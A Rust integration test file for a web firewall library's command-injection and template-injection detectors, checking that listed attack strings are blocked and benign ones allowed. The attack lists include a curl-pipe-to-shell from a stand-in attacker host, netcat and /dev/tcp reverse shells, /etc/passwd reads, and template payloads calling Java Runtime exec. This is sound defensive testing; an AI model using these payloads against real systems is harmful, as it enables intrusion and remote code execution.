//! Integration tests for W17-R-01: Semantic Command Injection (CMDi) & Template Injection (SSTI) Detectors.

use std::sync::Arc;

use libstrata::bundle::{self, Mode, Oversize, PolicySpec, Spec};
use libstrata::detectors::injection::{detect_cmdi, detect_ssti};
use libstrata::engine::Engine;
use libstrata::rules::{self, CondDef, RuleDef, TargetDef, Value as RValue};
use libstrata::tx::Tx;
use libstrata::verdict::{ACTION_ALLOW, ACTION_BLOCK, OK};

const SEED: [u8; 32] = [43; 32];

#[test]
fn test_cmdi_detection_suite() {
    // Attack payloads
    let attacks: &[&[u8]] = &[
        b"; cat /etc/passwd",
        b"| whoami",
        b"|| whoami",
        b"&& id",
        b"& dir",
        b"127.0.0.1; ping 8.8.8.8",
        b"test;cat+/etc/passwd",
        b"`id`",
        b"$(uname -a)",
        b";curl http://attacker.com/evil.sh | sh",
        b"cat$IFS/etc/passwd",
        b"c'a't /etc/passwd",
        b"cmd.exe /c dir",
        b"powershell.exe -enc AAAA",
        b"/bin/sh -c 'id'",
        b"2>&1",
        b"/dev/tcp/10.0.0.1/4444",
        b"sleep 5",
        b"test | nc -e /bin/sh 1.2.3.4 8080",
    ];

    for &payload in attacks {
        assert!(detect_cmdi(payload), "Payload must be detected: {}", String::from_utf8_lossy(payload));
    }

    // Benign payloads
    let benign: &[&[u8]] = &[
        b"hello world",
        b"category=electronics&sort=asc",
        b"concatenation",
        b"location=us",
        b"indicator",
        b"1 + 2 = 3; 4 + 5 = 9",
        b"Hello; nice to meet you",
        b"user@example.com",
        b"https://example.com/search?q=cat+photos",
        b"",
    ];

    for &payload in benign {
        assert!(!detect_cmdi(payload), "Benign must not trigger FP: {}", String::from_utf8_lossy(payload));
    }
}

#[test]
fn test_ssti_detection_suite() {
    // Attack payloads
    let attacks: &[&[u8]] = &[
        b"{{7*7}}",
        b"{{ 7 * 7 }}",
        b"{{7*'7'}}",
        b"${7*7}",
        b"#{7*7}",
        b"*{7*7}",
        b"<%= 7*7 %>",
        b"{{config.items()}}",
        b"{{self.__class__}}",
        b"{{''.__class__.__mro__[1].__subclasses__()}}",
        b"${T(java.lang.Runtime).getRuntime().exec('id')}",
        b"${ProcessBuilder.start()}",
        b"${''.getClass().forName('java.lang.Runtime')}",
        b"#{request.getParameter('cmd')}",
        b"{{request.application}}",
        b"<%= system('whoami') %>",
    ];

    for &payload in attacks {
        assert!(detect_ssti(payload), "SSTI payload must be detected: {}", String::from_utf8_lossy(payload));
    }

    // Benign payloads
    let benign: &[&[u8]] = &[
        b"hello world",
        b"Hello ${user}",
        b"Welcome {{name}}",
        b"Price: $100",
        b"{color: red}",
        b"7 * 7 = 49",
        b"width: 100%;",
        b"",
    ];

    for &payload in benign {
        assert!(!detect_ssti(payload), "Benign must not trigger FP: {}", String::from_utf8_lossy(payload));
    }
}

#[test]
fn test_cmdi_ssti_rules_in_engine() {
    let args_var = rules::code(rules::VARS, "args").expect("args var");
    let cmdi_op = rules::code(rules::OPERATORS, "detect_cmdi").expect("detect_cmdi op");
    let ssti_op = rules::code(rules::OPERATORS, "detect_ssti").expect("detect_ssti op");

    // Rule 100010: CMDi Semantic Rule
    let rule_cmdi = RuleDef {
        id: 100010,
        name: "Command Injection Semantic Detector".into(),
        layer: rules::code(rules::LAYERS, "managed").unwrap(),
        stage: rules::code(rules::STAGES, "request_headers").unwrap(),
        severity: 0, // critical
        score: 100,
        paranoia: 1,
        any: false,
        block_alone: true,
        signature: false,
        conditions: vec![CondDef {
            targets: vec![TargetDef {
                var: args_var,
                key: None,
                exclude: vec![],
                count: false,
            }],
            transforms: vec![],
            op: cmdi_op,
            negate: false,
            multi_match: false,
            value: RValue::None,
        }],
    };

    // Rule 100020: SSTI Semantic Rule
    let rule_ssti = RuleDef {
        id: 100020,
        name: "Server-Side Template Injection Semantic Detector".into(),
        layer: rules::code(rules::LAYERS, "managed").unwrap(),
        stage: rules::code(rules::STAGES, "request_headers").unwrap(),
        severity: 0, // critical
        score: 100,
        paranoia: 1,
        any: false,
        block_alone: true,
        signature: false,
        conditions: vec![CondDef {
            targets: vec![TargetDef {
                var: args_var,
                key: None,
                exclude: vec![],
                count: false,
            }],
            transforms: vec![],
            op: ssti_op,
            negate: false,
            multi_match: false,
            value: RValue::None,
        }],
    };

    let rules_list = vec![rule_cmdi, rule_ssti];
    let rule_sections = rules::encode(&rules_list, None);
    let refs: Vec<(u32, &[u8])> = rule_sections.iter().map(|(k, b)| (*k, &b[..])).collect();

    let spec = Spec {
        version: 1701,
        created_at_ms: 1000,
        flags: 0,
        policies: &[PolicySpec::new("semantic-policy", Mode::Enforce, Oversize::Pass)],
        sections: &refs,
    };

    let bundle_bytes = bundle::build(&spec, &SEED).unwrap();
    let engine = Arc::new(Engine::map(Box::new(bundle_bytes), &bundle::public_key(&SEED)).unwrap());

    // 1. CMDi Attack Blocked
    {
        let mut tx = Tx::new(Some(Arc::clone(&engine)), b"edge-01", 0);
        tx.set_policy(b"semantic-policy");
        assert_eq!(tx.request_line(b"GET", b"/api?cmd=;cat+/etc/passwd", b"/api", b"cmd=;cat+/etc/passwd", b"HTTP/1.1"), OK);
        assert_eq!(tx.request_headers(&[(b"Host", b"api.example.test")]), OK);
        let v = tx.verdict();
        assert_eq!(v.action, ACTION_BLOCK);
        assert!(v.rules[..v.n_rules as usize].contains(&100010));
    }

    // 2. SSTI Attack Blocked
    {
        let mut tx = Tx::new(Some(Arc::clone(&engine)), b"edge-01", 0);
        tx.set_policy(b"semantic-policy");
        assert_eq!(tx.request_line(b"GET", b"/api?tpl={{7*7}}", b"/api", b"tpl={{7*7}}", b"HTTP/1.1"), OK);
        assert_eq!(tx.request_headers(&[(b"Host", b"api.example.test")]), OK);
        let v = tx.verdict();
        assert_eq!(v.action, ACTION_BLOCK);
        assert!(v.rules[..v.n_rules as usize].contains(&100020));
    }

    // 3. Benign Request Allowed
    {
        let mut tx = Tx::new(Some(Arc::clone(&engine)), b"edge-01", 0);
        tx.set_policy(b"semantic-policy");
        assert_eq!(tx.request_line(b"GET", b"/api?item=electronics&user=alice", b"/api", b"item=electronics&user=alice", b"HTTP/1.1"), OK);
        assert_eq!(tx.request_headers(&[(b"Host", b"api.example.test")]), OK);
        let v = tx.verdict();
        assert_eq!(v.action, ACTION_ALLOW);
        assert_eq!(v.n_rules, 0);
    }
}
